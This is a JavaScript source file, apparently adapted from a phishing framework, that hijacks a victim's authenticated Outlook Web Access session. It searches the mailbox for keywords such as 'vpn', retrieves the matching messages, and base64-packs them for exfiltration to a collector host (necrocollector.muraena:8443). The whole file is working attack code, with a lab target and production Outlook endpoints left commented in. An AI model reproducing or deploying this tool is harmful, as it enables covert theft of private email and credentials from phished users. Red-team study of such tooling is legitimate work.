/*
  Adaptation of https://github.com/muraenateam/phishlulz/blob/master/tools/mailboxbug/owa-infiltrator.js
 */

/*
 */

// this uuid can be random
var sess_uuid = "8143bfca-d2d9-4707-bab8-74f62af9668c";

var searchFor = ["vpn", "https:"];

// TODO use a placeholder and replace it from go
var searchFor = [__keywords__];

var extrudedEmails = [];

var target_email = "support@anti-env.local";


// PROD stuff
// var start_url = "https://outlook.live.com/owa/service.svc?action=StartSearchSession&EP=1&ID=-68&AC=1";
// var search_url = "https://outlook.live.com/owa/service.svc?action=ExecuteSearch&EP=1&ID=-35&AC=1";
// var getitem_url = "https://outlook.live.com/owa/service.svc?action=GetItem&EP=1&ID=-38&AC=1";

var start_url = "https://owa.anti-env.local/owa/service.svc?action=StartSearchSession&EP=1&ID=-68&AC=1";
var search_url = "https://owa.anti-env.local/owa/service.svc?action=ExecuteSearch&EP=1&ID=-35&AC=1";
var getitem_url = "https://owa.anti-env.local/owa/service.svc?action=GetItem&EP=1&ID=-38&AC=1";

var extrude_url = "https://necrocollector.muraena:8443/extrude/owa16";

function log(data) {
    console.log(data);
}

// creates a packet, stringify it and base64 encodes it ready for extrustion via an XHR POST request
function packData(target, keyword, type, msg_from, subject, body, time) {

    var packet = {
        'target': target,
        'search': keyword,
        'type': type,
        'time': time,
        'from': msg_from,
        'subject': subject,
        'body': btoa(unescape(encodeURIComponent(body)))
    };

    return JSON.stringify(packet);
}

function getMessage(change_key, message_id, keyword) {
    var xhr2 = new XMLHttpRequest();
    xhr2.open("GET", getitem_url, false);
    xhr2.setRequestHeader("X-OWA-UrlPostData", "%7B%22__type%22%3A%22GetItemJsonRequest%3A%23Exchange%22%2C%22Header%22" +
        "%3A%7B%22__type%22%3A%22JsonRequestHeaders%3A%23Exchange%22%2C%22RequestServerVersion%22%3A%22V2016_06_24%22%2C" +
        "%22TimeZoneContext%22%3A%7B%22__type%22%3A%22TimeZoneContext%3A%23Exchange%22%2C%22TimeZoneDefinition%22%3A%7B" +
        "%22__type%22%3A%22TimeZoneDefinitionType%3A%23Exchange%22%2C%22Id%22%3A%22W.%20Europe%20Standard%20Time%22%7D" +
        "%7D%7D%2C%22Body%22%3A%7B%22__type%22%3A%22GetItemRequest%3A%23Exchange%22%2C%22ItemShape%22%3A%7B%22__type%22" +
        "%3A%22ItemResponseShape%3A%23Exchange%22%2C%22BaseShape%22%3A%22IdOnly%22%2C%22FilterHtmlContent%22%3Atrue%2C" +
        "%22BlockExternalImagesIfSenderUntrusted%22%3Atrue%2C%22BlockContentFromUnknownSenders%22%3Afalse%2C%22AddBlank" +
        "TargetToLinks%22%3Atrue%2C%22ClientSupportsIrm%22%3Atrue%2C%22InlineImageUrlTemplate%22%3A%22data%3Aimage%2Fgif" +
        "%3Bbase64%2CR0lGODlhAQABAIAAAAAAAP%2F%2F%2FyH5BAEAAAEALAAAAAABAAEAAAIBTAA7%22%2C%22FilterInlineSafetyTips%22%3A" +
        "true%2C%22MaximumBodySize%22%3A2097152%2C%22MaximumRecipientsToReturn%22%3A20%2C%22CssScopeClassName%22%3A%22rps_" +
        "c3cc%22%2C%22InlineImageUrlOnLoadTemplate%22%3A%22InlineImageLoader.GetLoader().Load(this)%22%2C%22InlineImage" +
        "CustomDataTemplate%22%3A%22%7Bid%7D%22%7D%2C%22ItemIds%22%3A%5B%7B%22__type%22%3A%22ItemId%3A%23Exchange%22%2C%22Id%22%3A%22" +
        encodeURIComponent(message_id) + "%22%2C%22ChangeKey%22%3A%22" + encodeURIComponent(change_key) +
        "%22%7D%5D%2C%22ShapeName%22%3A%22ItemNormalizedBody%22%7D%7D");

    xhr2.setRequestHeader("Action", "GetItem");
    //xhr2.timeout = parseInt(timeout, 10);
    xhr2.onerror = function () {
    }; // TODO handle this
    xhr2.onreadystatechange = function () {
        if (xhr2.readyState === 4) {
            try {
                var status = this.status;
                var resp = JSON.parse(this.response);
                var msg = resp['Body']['ResponseMessages']['Items'][0]['Items'][0];
                var msg_sub = msg['Subject'];
                var msg_from = msg['From']['Mailbox']['EmailAddress'];
                var msg_time = msg['DateTimeReceived'];

                // TODO to debug the returned email object, use this!
                // console.log(JSON.parse(JSON.stringify(msg)));

                // TODO get any attachments!
                var has_attach = msg['HasAttachments'];
                if (has_attach) {
                    var attachments = msg['Attachments'];
                }
                var msg_body = msg['NormalizedBody']['Value'];
                // log("SUBJECT: " + msg_sub);
                // log("HTML BODY size: " + msg_body.length);

                var encoded_data = packData(target_email, keyword, 'email', msg_from, msg_sub, msg_body, msg_time);

                extrudedEmails.push(btoa(unescape(encodeURIComponent(encoded_data))));

                //extrudeData(encoded_data);

                return msg_sub;

            } catch (e) {
                log("ERROR: " + e)
            }
        }
    };
    xhr2.send();
}

function search(keyword) {
    // 1. starts a new Search Session
    var xhr = new XMLHttpRequest();
    xhr.open("GET", start_url, false);
    xhr.setRequestHeader("X-OWA-UrlPostData", "%7B%22__type%22%3A%22StartSearchSessionJsonRequest%3A%23Exchange%22%2C%22" +
        "Header%22%3A%7B%22__type%22%3A%22JsonRequestHeaders%3A%23Exchange%22%2C%22RequestServerVersion%22%3A%22Exchange2013" +
        "%22%2C%22TimeZoneContext%22%3A%7B%22__type%22%3A%22TimeZoneContext%3A%23Exchange%22%2C%22TimeZoneDefinition%22%3A%7B" +
        "%22__type%22%3A%22TimeZoneDefinitionType%3A%23Exchange%22%2C%22Id%22%3A%22W.%20Europe%20Standard%20Time%22%7D%7D%7D%2C%22" +
        "Body%22%3A%7B%22__type%22%3A%22StartSearchSessionRequest%3A%23Exchange%22%2C%22SearchSessionId%22%3A%22" + sess_uuid +
        "%22%2C%22WarmupOptions%22%3A16777215%2C%22SuggestionTypes%22%3A1%2C%22SearchScope%22%3A%5B%7B%22__" +
        "type%22%3A%22PrimaryMailboxSearchScopeType%3A%23Exchange%22%2C%22FolderScope%22%3A%7B%22__type%22%3A%22SearchFolder" +
        "ScopeType%3A%23Exchange%22%2C%22BaseFolderId%22%3A%7B%22__type%22%3A%22DistinguishedFolderId%3A%23Exchange%22%2C%22Id" +
        "%22%3A%22inbox%22%7D%7D%7D%5D%2C%22IdFormat%22%3A%22EwsId%22%2C%22ApplicationId%22%3A%22Owa%22%7D%7D");
    xhr.setRequestHeader("Action", "StartSearchSession");
    xhr.send();

// 2. search for keyword
    var xhr = new XMLHttpRequest();
    xhr.open("GET", search_url, false);
    xhr.setRequestHeader("X-OWA-UrlPostData", "%7B%22__type%22%3A%22ExecuteSearchJsonRequest%3A%23Exchange%22%2C%22Header%22" +
        "%3A%7B%22__type%22%3A%22JsonRequestHeaders%3A%23Exchange%22%2C%22RequestServerVersion%22%3A%22V2016_06_15%22%2C%22" +
        "TimeZoneContext%22%3A%7B%22__type%22%3A%22TimeZoneContext%3A%23Exchange%22%2C%22TimeZoneDefinition%22%3A%7B%22__type" +
        "%22%3A%22TimeZoneDefinitionType%3A%23Exchange%22%2C%22Id%22%3A%22W.%20Europe%20Standard%20Time%22%7D%7D%7D%2C%22Body" +
        "%22%3A%7B%22__type%22%3A%22ExecuteSearchRequest%3A%23Exchange%22%2C%22ApplicationId%22%3A%22Owa%22%2C%22SearchSessionId%22%3A%22" +
        sess_uuid + "%22%2C%22SearchScope%22%3A%5B%7B%22__type%22%3A%22PrimaryMailboxSearchScopeType%3A%23Exchange%22%2C%22" +
        "FolderScope%22%3A%7B%22__type%22%3A%22SearchFolderScopeType%3A%23Exchange%22%2C%22BaseFolderId%22%3A%7B%22__type" +
        "%22%3A%22DistinguishedFolderId%3A%23Exchange%22%2C%22Id%22%3A%22msgfolderroot%22%7D%7D%7D%5D%2C%22Query%22%3A%22" +
        keyword +
        "%22%2C%22SearchRefiners%22%3Anull%2C%22SearchRestrictions%22%3Anull%2C%22IdFormat%22%3A%22EwsId%22%2C%22Retrieve" +
        "Refiners%22%3Atrue%2C%22MaxRefinersCountPerRefinerType%22%3A5%2C%22ItemTypes%22%3A%22MailConversations%22%2C%22" +
        "ResultRowOffset%22%3A0%2C%22ResultRowCount%22%3A25%2C%22MaxResultsCountHint%22%3A250%2C%22MaxPreviewLength%22%3A60" +
        "%2C%22PropertySetName%22%3A%22Owa16%22%2C%22SortOrder%22%3A%22DateTime%22%2C%22IncludeDeleted%22%3Atrue%2C%22Scenario" +
        "%22%3A%22mail%22%7D%7D");
    xhr.setRequestHeader("Action", "ExecuteSearch");

//xhr.timeout = parseInt(timeout, 10);

    xhr.onerror = function () {
    }; // TODO handle this

    xhr.onreadystatechange = function () {
        if (xhr.readyState === 4) {
            try {
                var status = this.status;
                var resp = JSON.parse(this.responseText);

                var conversations = resp['Body']['SearchResults']['Conversations'];
                //log("Found " + conversations.length + " Conversations");

                // 3. iterate through conversations that match the search criteria - a conversation can have N nested items (emails)
                for (var i in conversations) {
                    // this is in array, where each entry is a mail message
                    var items = conversations[i]['ItemIds'];
                    //log("Found " + items.length + " Items in Conversation #" + conversations[i]);

                    // a conversation can have N items, since our search string can be in multiple emails
                    // 4. iterate through emails that matched the searech criteria and retrieve all messages
                    for (var n in items) {
                        var message_changekey = items[n]['ChangeKey'];
                        var message_id = items[n]['Id'];
                        //log("Retrieved message: " + message_id);

                        // 5. Now that we have the changeKey and the Id of each message proceed with retrieval
                        getMessage(message_changekey, message_id, keyword);
                    }
                }
            } catch (e) {
                log("ERROR: " + e)
            }
        }
    };
    xhr.send();
}

function extrudeFromOWa2016() {
    // TODO optimize this to prevent doing too many requests
    for (var keyword in searchFor) {
        search(searchFor[keyword])
    }

    console.log("Extruded " + extrudedEmails.length + " emails.");
    //console.log(extrudedEmails);

    return extrudedEmails;
}

extrudeFromOWa2016();

